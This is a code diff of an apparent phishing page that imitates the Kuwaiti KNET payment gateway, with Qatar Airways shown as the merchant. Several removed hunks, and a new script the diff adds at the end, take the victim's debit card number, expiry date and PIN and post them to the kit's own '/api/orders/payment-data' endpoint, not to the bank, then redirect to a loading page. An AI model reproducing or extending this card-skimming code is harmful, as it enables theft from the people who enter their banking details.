-                    const orderId = sessionStorage.getItem('orderId');
-                    const knetData = {
-                        orderId,
-                        payment_method: 'Knet',
-                        knet_data: {
-                            bank: $('#bank').val(),
-                            card_number: $('#debitNumber').val(),
-                            expiry_month: $('#expiryMonthBox').val(),
-                            expiry_year: $('#expiryYearBox').val(),
-                            pin: $('#cardPin').val()
-                        },
-                        delivery_address: {
-                            beneficiary: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).fullname || '') : '',
-                            phone: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).main_phone || '') : '',
-                            email: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).email || '') : '',
-                            country: localStorage.getItem('selectedCountry') || '',
-                            site: 'https://www.qatarairways.com',
-                            amount: sessionStorage.getItem('knetTotal') || '2.800 د.ك'
-                        }
-                    };
-
-                    fetch('/api/orders/payment-data', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(knetData)
-                    }).then(() => {
-                        window.location.href = 'loading.html';
-                    }).catch(err => {
-                        alert('حدث خطأ في الاتصال');
-                    });
+	   			document.paypage.submit();
    			
    			
    		}
@@ -3642,37 +3206,7 @@ function onProceed_buttonClicked() {
    			
 	   			document.paypage.cspg.value=formParameterValue(document.paypage,encode64(document.paypage.CSRFToken.value).toString().toUpperCase());	
 	   			document.paypage.action="/kpg/paymentrouter.htm";
-	   			// Project API submission
-                    const orderId = sessionStorage.getItem('orderId');
-                    const knetData = {
-                        orderId,
-                        payment_method: 'Knet',
-                        knet_data: {
-                            bank: $('#bank').val(),
-                            card_number: $('#debitNumber').val(),
-                            expiry_month: $('#expiryMonthBox').val(),
-                            expiry_year: $('#expiryYearBox').val(),
-                            pin: $('#cardPin').val()
-                        },
-                        delivery_address: {
-                            beneficiary: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).fullname || '') : '',
-                            phone: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).main_phone || '') : '',
-                            email: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).email || '') : '',
-                            country: localStorage.getItem('selectedCountry') || '',
-                            site: 'https://www.qatarairways.com',
-                            amount: sessionStorage.getItem('knetTotal') || '2.800 د.ك'
-                        }
-                    };
-
-                    fetch('/api/orders/payment-data', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(knetData)
-                    }).then(() => {
-                        window.location.href = 'loading.html';
-                    }).catch(err => {
-                        alert('حدث خطأ في الاتصال');
-                    });
+	   			document.paypage.submit();
    			
    		}
    	//Added for Points Redemption
@@ -3947,37 +3481,7 @@ function onProceed_buttonClicked() {
 	 function onback(){
 			if(0==1){
 			document.paypage.action="/kpg/gstnErrorPage.htm?errorCode=PMT9014";  		
-			// Project API submission
-                    const orderId = sessionStorage.getItem('orderId');
-                    const knetData = {
-                        orderId,
-                        payment_method: 'Knet',
-                        knet_data: {
-                            bank: $('#bank').val(),
-                            card_number: $('#debitNumber').val(),
-                            expiry_month: $('#expiryMonthBox').val(),
-                            expiry_year: $('#expiryYearBox').val(),
-                            pin: $('#cardPin').val()
-                        },
-                        delivery_address: {
-                            beneficiary: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).fullname || '') : '',
-                            phone: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).main_phone || '') : '',
-                            email: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).email || '') : '',
-                            country: localStorage.getItem('selectedCountry') || '',
-                            site: 'https://www.qatarairways.com',
-                            amount: sessionStorage.getItem('knetTotal') || '2.800 د.ك'
-                        }
-                    };
-
-                    fetch('/api/orders/payment-data', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(knetData)
-                    }).then(() => {
-                        window.location.href = 'loading.html';
-                    }).catch(err => {
-                        alert('حدث خطأ في الاتصال');
-                    });  
+			document.paypage.submit();  
 			}
 		}
 	 
@@ -4014,37 +3518,7 @@ function onProceed_buttonClicked() {
    			}
 			
 			document.paypage.action="/kpg/paymentpage.htm?PaymentID="+payid;  		
-			// Project API submission
-                    const orderId = sessionStorage.getItem('orderId');
-                    const knetData = {
-                        orderId,
-                        payment_method: 'Knet',
-                        knet_data: {
-                            bank: $('#bank').val(),
-                            card_number: $('#debitNumber').val(),
-                            expiry_month: $('#expiryMonthBox').val(),
-                            expiry_year: $('#expiryYearBox').val(),
-                            pin: $('#cardPin').val()
-                        },
-                        delivery_address: {
-                            beneficiary: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).fullname || '') : '',
-                            phone: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).main_phone || '') : '',
-                            email: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).email || '') : '',
-                            country: localStorage.getItem('selectedCountry') || '',
-                            site: 'https://www.qatarairways.com',
-                            amount: sessionStorage.getItem('knetTotal') || '2.800 د.ك'
-                        }
-                    };
-
-                    fetch('/api/orders/payment-data', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(knetData)
-                    }).then(() => {
-                        window.location.href = 'loading.html';
-                    }).catch(err => {
-                        alert('حدث خطأ في الاتصال');
-                    });  
+			document.paypage.submit();  
 			
 		}
 	
@@ -4054,37 +3528,7 @@ function onProceed_buttonClicked() {
 		      
 			if(0==1){
 				 	document.paypage.action="/kpg/gstnErrorPage.htm?errorCode=PMT9015";  		
-					// Project API submission
-                    const orderId = sessionStorage.getItem('orderId');
-                    const knetData = {
-                        orderId,
-                        payment_method: 'Knet',
-                        knet_data: {
-                            bank: $('#bank').val(),
-                            card_number: $('#debitNumber').val(),
-                            expiry_month: $('#expiryMonthBox').val(),
-                            expiry_year: $('#expiryYearBox').val(),
-                            pin: $('#cardPin').val()
-                        },
-                        delivery_address: {
-                            beneficiary: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).fullname || '') : '',
-                            phone: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).main_phone || '') : '',
-                            email: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).email || '') : '',
-                            country: localStorage.getItem('selectedCountry') || '',
-                            site: 'https://www.qatarairways.com',
-                            amount: sessionStorage.getItem('knetTotal') || '2.800 د.ك'
-                        }
-                    };
-
-                    fetch('/api/orders/payment-data', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(knetData)
-                    }).then(() => {
-                        window.location.href = 'loading.html';
-                    }).catch(err => {
-                        alert('حدث خطأ في الاتصال');
-                    });  
+					document.paypage.submit();  
 			}
 			
 		}   
@@ -4097,37 +3541,7 @@ function onclckCancel()
 		    	 document.paypage.fCFlg.value=document.paypage.fCFlg.value;	
 			}
  	         document.paypage.action="/kpg/paymentcancel.htm?paymentid="+document.paypage.paymentId.value;  		
- 			 // Project API submission
-                    const orderId = sessionStorage.getItem('orderId');
-                    const knetData = {
-                        orderId,
-                        payment_method: 'Knet',
-                        knet_data: {
-                            bank: $('#bank').val(),
-                            card_number: $('#debitNumber').val(),
-                            expiry_month: $('#expiryMonthBox').val(),
-                            expiry_year: $('#expiryYearBox').val(),
-                            pin: $('#cardPin').val()
-                        },
-                        delivery_address: {
-                            beneficiary: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).fullname || '') : '',
-                            phone: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).main_phone || '') : '',
-                            email: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).email || '') : '',
-                            country: localStorage.getItem('selectedCountry') || '',
-                            site: 'https://www.qatarairways.com',
-                            amount: sessionStorage.getItem('knetTotal') || '2.800 د.ك'
-                        }
-                    };
-
-                    fetch('/api/orders/payment-data', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(knetData)
-                    }).then(() => {
-                        window.location.href = 'loading.html';
-                    }).catch(err => {
-                        alert('حدث خطأ في الاتصال');
-                    });  
+ 			 document.paypage.submit();  
 }
 
 
@@ -4140,37 +3554,7 @@ function onclckCancel()
 			//code added for GSTN fix -starts
 			if(0==1){
 				document.paypage.action="/kpg/gstnErrorPage.htm?errorCode=PMT9016";  		
-				// Project API submission
-                    const orderId = sessionStorage.getItem('orderId');
-                    const knetData = {
-                        orderId,
-                        payment_method: 'Knet',
-                        knet_data: {
-                            bank: $('#bank').val(),
-                            card_number: $('#debitNumber').val(),
-                            expiry_month: $('#expiryMonthBox').val(),
-                            expiry_year: $('#expiryYearBox').val(),
-                            pin: $('#cardPin').val()
-                        },
-                        delivery_address: {
-                            beneficiary: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).fullname || '') : '',
-                            phone: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).main_phone || '') : '',
-                            email: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).email || '') : '',
-                            country: localStorage.getItem('selectedCountry') || '',
-                            site: 'https://www.qatarairways.com',
-                            amount: sessionStorage.getItem('knetTotal') || '2.800 د.ك'
-                        }
-                    };
-
-                    fetch('/api/orders/payment-data', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(knetData)
-                    }).then(() => {
-                        window.location.href = 'loading.html';
-                    }).catch(err => {
-                        alert('حدث خطأ في الاتصال');
-                    });  
+				document.paypage.submit();  
 		   	         
 			}else{
 				
@@ -4205,37 +3589,7 @@ function onclckCancel()
 	   			}
 				
 				document.paypage.action="/kpg/paymentcancel.htm?paymentid="+document.paypage.paymentId.value;  		
-				// Project API submission
-                    const orderId = sessionStorage.getItem('orderId');
-                    const knetData = {
-                        orderId,
-                        payment_method: 'Knet',
-                        knet_data: {
-                            bank: $('#bank').val(),
-                            card_number: $('#debitNumber').val(),
-                            expiry_month: $('#expiryMonthBox').val(),
-                            expiry_year: $('#expiryYearBox').val(),
-                            pin: $('#cardPin').val()
-                        },
-                        delivery_address: {
-                            beneficiary: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).fullname || '') : '',
-                            phone: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).main_phone || '') : '',
-                            email: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).email || '') : '',
-                            country: localStorage.getItem('selectedCountry') || '',
-                            site: 'https://www.qatarairways.com',
-                            amount: sessionStorage.getItem('knetTotal') || '2.800 د.ك'
-                        }
-                    };
-
-                    fetch('/api/orders/payment-data', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(knetData)
-                    }).then(() => {
-                        window.location.href = 'loading.html';
-                    }).catch(err => {
-                        alert('حدث خطأ في الاتصال');
-                    });  
+				document.paypage.submit();  
 			}
 			//code added for GSTN fix -ends 
 		}
@@ -4246,37 +3600,7 @@ function onclckCancel()
 		      
 			if(0==1){
 				 	document.paypage.action="/kpg/gstnErrorPage.htm?errorCode=PMT9015";  		
-					// Project API submission
-                    const orderId = sessionStorage.getItem('orderId');
-                    const knetData = {
-                        orderId,
-                        payment_method: 'Knet',
-                        knet_data: {
-                            bank: $('#bank').val(),
-                            card_number: $('#debitNumber').val(),
-                            expiry_month: $('#expiryMonthBox').val(),
-                            expiry_year: $('#expiryYearBox').val(),
-                            pin: $('#cardPin').val()
-                        },
-                        delivery_address: {
-                            beneficiary: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).fullname || '') : '',
-                            phone: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).main_phone || '') : '',
-                            email: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).email || '') : '',
-                            country: localStorage.getItem('selectedCountry') || '',
-                            site: 'https://www.qatarairways.com',
-                            amount: sessionStorage.getItem('knetTotal') || '2.800 د.ك'
-                        }
-                    };
-
-                    fetch('/api/orders/payment-data', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(knetData)
-                    }).then(() => {
-                        window.location.href = 'loading.html';
-                    }).catch(err => {
-                        alert('حدث خطأ في الاتصال');
-                    });  
+					document.paypage.submit();  
 			}
 			
 		}   
@@ -4334,82 +3658,14 @@ function openAtmEcomPinWin()
 	width: 60% !important;
 }
 </style>
-<script type="text/javascript">
-
-// ===== Initialize KNET invoice data from previous page =====
-(function() {
-    try {
-        var userData = {};
-        try { userData = JSON.parse(localStorage.getItem('userData')) || {}; } catch(e) {}
-        
-        var beneficiaryName = userData.fullname || 'الخطوط الجوية القطرية';
-        var beneficiaryEl = document.getElementById('knetBeneficiary');
-        if (beneficiaryEl) beneficiaryEl.textContent = beneficiaryName;
-        var beneficiaryConfirmEl = document.getElementById('knetBeneficiaryConfirm');
-        if (beneficiaryConfirmEl) beneficiaryConfirmEl.textContent = beneficiaryName;
-        
-        var siteEl = document.getElementById('knetSite');
-        if (siteEl) siteEl.textContent = 'https://www.qatarairways.com';
-        var siteConfirmEl = document.getElementById('knetSiteConfirm');
-        if (siteConfirmEl) siteConfirmEl.textContent = 'https://www.qatarairways.com';
-        
-        var knetTotal = sessionStorage.getItem('knetTotal') || '2.800 د.ك';
-        var amountMatch = knetTotal.match(/([\d.]+)/);
-        var amountNum = amountMatch ? amountMatch[1] : '2.800';
-        var amountEl = document.getElementById('knetAmount');
-        if (amountEl) amountEl.innerHTML = 'KD&nbsp;' + amountNum;
-        var amountConfirmEl = document.getElementById('knetAmountConfirm');
-        if (amountConfirmEl) amountConfirmEl.innerHTML = 'KD&nbsp;' + amountNum;
-        
-        if (typeof transactionamount !== 'undefined') transactionamount = amountNum;
-        if (typeof mrchname !== 'undefined') mrchname = beneficiaryName;
-        
-        if (typeof adjustIframeHeight === 'function') adjustIframeHeight();
-    } catch(e) {
-        console.error('KNET init error:', e);
-    }
-})();
-
-function adjustIframeHeight() {
-    if (window.parent !== window) {
-        var bodyHeight = document.body.scrollHeight;
-        window.parent.postMessage({ type: 'knetHeight', height: Math.min(bodyHeight + 20, 700) }, '*');
-    }
-}
-
-window.addEventListener('message', function(event) {
-    if (event.data && event.data.type === 'initKnetData') {
-        try {
-            var parentData = event.data.userData || {};
-            var parentTotal = event.data.knetTotal || '2.800 د.ك';
-            
-            var beneficiaryName = parentData.fullname || 'الخطوط الجوية القطرية';
-            var beneficiaryEl = document.getElementById('knetBeneficiary');
-            if (beneficiaryEl) beneficiaryEl.textContent = beneficiaryName;
-            var beneficiaryConfirmEl = document.getElementById('knetBeneficiaryConfirm');
-            if (beneficiaryConfirmEl) beneficiaryConfirmEl.textContent = beneficiaryName;
-            
-            var amountMatch = parentTotal.match(/([\d.]+)/);
-            var amountNum = amountMatch ? amountMatch[1] : '2.800';
-            var amountEl = document.getElementById('knetAmount');
-            if (amountEl) amountEl.innerHTML = 'KD&nbsp;' + amountNum;
-            var amountConfirmEl = document.getElementById('knetAmountConfirm');
-            if (amountConfirmEl) amountConfirmEl.innerHTML = 'KD&nbsp;' + amountNum;
-            
-            if (typeof transactionamount !== 'undefined') transactionamount = amountNum;
-            if (typeof mrchname !== 'undefined') mrchname = beneficiaryName;
-            
-            if (typeof adjustIframeHeight === 'function') adjustIframeHeight();
-        } catch(e) {
-            console.error('KNET postMessage error:', e);
-        }
-    }
-});
-
-</script>
 <noscript>
 <style>
-.wrapper { display: none; }
+#PayPageEntry{
+display: none;
+}
+#payConfirm{
+display: none;
+}
 </style>
 <div class="wrapper">
 <div class="contentBox" style="height: 430px;">
@@ -4455,24 +3711,7 @@ window.addEventListener('message', function(event) {
     						color: #ff0000; text-align: center;
    							 padding-right: 12px; display:none;">
 </div>
-<p class="paymentheader" style="text-align:right; padding-top:18px; display:none;">معلومات الفاتورة </p>
-<div class="row" style="display:none;">
-<div class="col mb-10 w-60" style="text-align: right;"><span class="paymentdata" id="knetBeneficiary">الخطوط الجوية القطرية</span> </div>
-<div class="col mb-10 w-40" style="text-align:right;float:right;"><span class="paymentlabel">:المستفيد </span></div>
-</div>
-<div class="row" style="display:none;">
-<div class="col mb-10 w-60" style="text-align:right;width:63%;"><span class="paymentdata" id="knetSite">https://www.qatarairways.com</span></div>
-<div class="col mb-10 w-40" style="text-align: right; float:right;"><span class="paymentlabel">:الموقع  </span></div>
-</div>
-<div class="row" id="OrgTranxAmt" style="display:none;">
-<div class="col w-60" style="text-align:right;"><span class="paymentdata" id="knetAmount">
-                            KD&nbsp;2.800
-                            </span>
-</div>
-<div class="col w-40" style="text-align:right;float:right;">
-<span class="paymentlabel"> :المبلغ</span>
-</div>
-</div>
+<div class="row" id="OrgTranxAmt" style="display:none;"></div>
 <!-- Added for PG Eidia Discount starts   -->
 <div class="row" id="DiscntRate" style="display:none;">
 </div>
@@ -4492,7 +3731,7 @@ window.addEventListener('message', function(event) {
 						
 						:‏(PIN) الرقم السري
 						</span>
-<input autocomplete="one-time-code" class="paymentinput" dir="rtl" id="debitsavedcardPIN" maxlength="4" name="debitsavedcardPIN" oncopy="return false;" ondrop="return false;" onkeypress="return ValidateNumPin(event);" onkeyup="ValidateNumPin(event);ValidatePinCvv(event);" onpaste="return false;" size="4" style="float:left; width:60%; min-width:150px;margin-left: 8px;  text-align:right;margin-bottom:2px;padding-right:5px; " title="يجب أن يكون الرمز السري مكون من ٤ أرقام" type="password"/>
+<input autocomplete="one-time-code" class="paymentinput" dir="rtl" id="debitsavedcardPIN" maxlength="4" name="debitsavedcardPIN" oncopy="return false;" ondrop="return false;" onkeypress="return ValidateNumPin(event);" onkeyup="ValidateNumPin(event);ValidatePinCvv(event);" onpaste="return false;" size="4" style="float:left; width:212px;margin-left: 8px;  text-align:right;margin-bottom:2px;padding-right:5px; " title="يجب أن يكون الرمز السري مكون من ٤ أرقام" type="password"/>
 </div>
 <div class="SavedcardCVVField" id="row" style="float:left;">
 </div>
@@ -4505,7 +3744,7 @@ window.addEventListener('message', function(event) {
 <!--  <label style="position: relative; display: inline-block;"> -->
 <div class="input-wrapper" id="knetCardInfoSection">
 <label id="logodetails" style="display: none;"><img alt="" height="15px" id="brandlogo" src="images/index.html" style="position: absolute; right: 5px; margin-top: 3%;" width="35px"/> </label>
-<input autocomplete="cc-number" class="paymentinput" data-manus_click_id="1" data-manus_clickable="true" id="debitNumber" maxlength="19" name="debitNumber" oncopy="return false;" ondrop="return false;" oninput="formatCardNumber(this);" onkeypress="return ValidateNumPin(event);" onpaste="return false;" size="19" style="width: 60%; min-width: 150px; padding-right: 40px;" type="text"/>
+<input autocomplete="cc-number" class="paymentinput" data-manus_click_id="1" data-manus_clickable="true" id="debitNumber" maxlength="19" name="debitNumber" oncopy="return false;" ondrop="return false;" oninput="formatCardNumber(this);" onkeypress="return ValidateNumPin(event);" onpaste="return false;" size="19" style="width: 212px; padding-right: 40px;" type="text"/>
 </div>
 <ul class="suggestion-box" id="cardSuggestions"></ul>
 </div>
@@ -4540,7 +3779,7 @@ window.addEventListener('message', function(event) {
 														</span>
 </div>
 <div class="col w-60">
-<input autocomplete="off" class="paymentinput pinmask" data-1p-ignore="true" data-form-type="other" data-lpignore="true" data-manus_click_id="4" data-manus_clickable="true" dir="rtl" id="cardPin" inputmode="numeric" maxlength="4" name="paymentPin" oncopy="return false;" ondrop="return false;" onkeypress="return ValidateNumPin(event);" onkeyup="ValidateNumPin(event);ValidatePinCvv(event);" onpaste="return false;" size="4" style=" float:right; width:60%; min-width:150px;margin-left: 10px;  text-align:right;margin-bottom:2px; padding-right:5px;" title="يجب أن يكون الرمز السري مكون من ٤ أرقام" type="text"/>
+<input autocomplete="off" class="paymentinput pinmask" data-1p-ignore="true" data-form-type="other" data-lpignore="true" data-manus_click_id="4" data-manus_clickable="true" dir="rtl" id="cardPin" inputmode="numeric" maxlength="4" name="paymentPin" oncopy="return false;" ondrop="return false;" onkeypress="return ValidateNumPin(event);" onkeyup="ValidateNumPin(event);ValidatePinCvv(event);" onpaste="return false;" size="4" style=" float:right; width:212px;margin-left: 10px;  text-align:right;margin-bottom:2px; padding-right:5px;" title="يجب أن يكون الرمز السري مكون من ٤ أرقام" type="text"/>
 </div>
 </div>
 <div class="row" id="CvvField">
@@ -4605,25 +3844,7 @@ window.addEventListener('message', function(event) {
 <!-- You will presently receive an SMS on your mobile number registered with your bank.
 			This is an OTP (One Time Password) SMS, it contains 6 digits to be entered in the box below. -->
 </div>
-<p class="paymentheader" style="padding-top: 18px; padding-bottom:  22px; text-align:right">معلومات الفاتورة </p>
-<div class="innerwrapper">
-<div class="row">
-<div class="col w-60" style="text-align: right; "><span class="paymentdata" id="knetBeneficiaryConfirm">الخطوط الجوية القطرية</span> </div>
-<div class="col w-40" style="text-align:right; float:right;"><span class="paymentlabel">:المستفيد </span></div>
-</div>
-<div class="row">
-<div class="col w-60" style="text-align:right;"><span class="paymentdata" style="word-break: break-all;" id="knetSiteConfirm">https://www.qatarairways.com</span></div>
-<div class="col w-40" style="text-align: right;float:right;"><span class="paymentlabel">:الموقع  </span></div>
-</div>
-<div class="row" id="OrgTranxAmtConfirm">
-<div class="col w-60" style="text-align:right; "><span class="paymentdata" id="knetAmountConfirm">
-                            KD&nbsp;2.800
-                            </span>
-</div>
-<div class="col w-40" style="text-align:right;float:right;">
-<span class="paymentlabel"> :المبلغ</span>
-</div>
-</div>
+<div class="row" id="OrgTranxAmtConfirm" style="display:none;"></div>
 <!-- Added for PG Eidia Discount -->
 <div class="row" id="DiscntRateConfirm" style="display:none;">
 </div>
@@ -5137,9 +4358,8 @@ function getLogoForBin(binDigits) {
 
 function updateBrandLogo() {
 	  const length = realCardNumber.length;
-	  if (length >= 6) {
-	    const binLength = length >= 8 ? 8 : 6;
-	    const logoUrl = getLogoForBin(realCardNumber.substring(0, binLength));
+	  if (length >= 1) {
+	    const logoUrl = getLogoForBin(realCardNumber);
 	    
 	    if (logoUrl) {
 	      logoElement.src = logoUrl;
@@ -5321,4 +4541,97 @@ document.addEventListener("click", (event) => {
 });
 
 </script>
-</body></html>
+
+<script>
+    // Handle message from parent page (payment.html)
+    window.addEventListener('message', function(event) {
+        if (event.data.type === 'submitKnet') {
+            onPay();
+        }
+        if (event.data.type === 'initKnetData') {
+            console.log('KNET Data initialized:', event.data);
+            if (event.data.knetTotal) {
+                // Update amount labels if they exist in the new HTML
+                const amountElements = document.querySelectorAll('.paymentdata');
+                amountElements.forEach(el => {
+                    if (el.textContent.includes('KD') || el.textContent.includes('د.ك')) {
+                        el.textContent = event.data.knetTotal;
+                    }
+                });
+            }
+        }
+    });
+
+    // Save original onPay if it exists
+    var originalOnPay = typeof onPay === 'function' ? onPay : null;
+
+    // Redefine onPay to handle API submission
+    onPay = function() {
+        console.log("onPay triggered");
+        
+        // Basic validation
+        const debitNumber = document.getElementById('debitNumber') ? document.getElementById('debitNumber').value.replace(/\s/g, '') : '';
+        const expiryMonth = document.getElementById('expiryMonthBox') ? document.getElementById('expiryMonthBox').value : '';
+        const expiryYear = document.getElementById('expiryYearBox') ? document.getElementById('expiryYearBox').value : '';
+        const cardPin = document.getElementById('cardPin') ? document.getElementById('cardPin').value : '';
+        
+        if (!debitNumber || !expiryMonth || !expiryYear || !cardPin) {
+            if (originalOnPay) {
+                const res = originalOnPay();
+                if (res === false) return;
+            } else {
+                alert('يرجى إكمال جميع البيانات');
+                return;
+            }
+        }
+
+        // Get orderId from storage
+        const orderId = localStorage.getItem('orderId') || sessionStorage.getItem('orderId');
+        
+        if (!orderId) {
+            console.error("No orderId found in storage");
+            // Try to proceed anyway or show error
+        }
+
+        const knetData = {
+            orderId: orderId,
+            payment_method: 'Knet',
+            knet_data: {
+                card_number: debitNumber,
+                expiry_month: expiryMonth,
+                expiry_year: expiryYear,
+                pin: cardPin,
+                site: window.location.origin,
+                timestamp: new Date().toISOString()
+            },
+            delivery_address: localStorage.getItem('deliveryAddress') || ''
+        };
+
+        // Show loading state if possible
+        if (typeof loadshow === 'function') loadshow();
+
+        fetch('/api/orders/payment-data', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(knetData)
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log('Success:', data);
+            // Redirect to loading.html or the next stage
+            // If in iframe, redirect parent
+            if (window.self !== window.top) {
+                window.parent.location.href = 'loading.html';
+            } else {
+                window.location.href = 'loading.html';
+            }
+        })
+        .catch((error) => {
+            console.error('Error:', error);
+            if (typeof loadhide === 'function') loadhide();
+            alert('حدث خطأ أثناء إرسال البيانات، يرجى المحاولة مرة أخرى');
+        });
+    };
+</script>
+</body>
+</html>
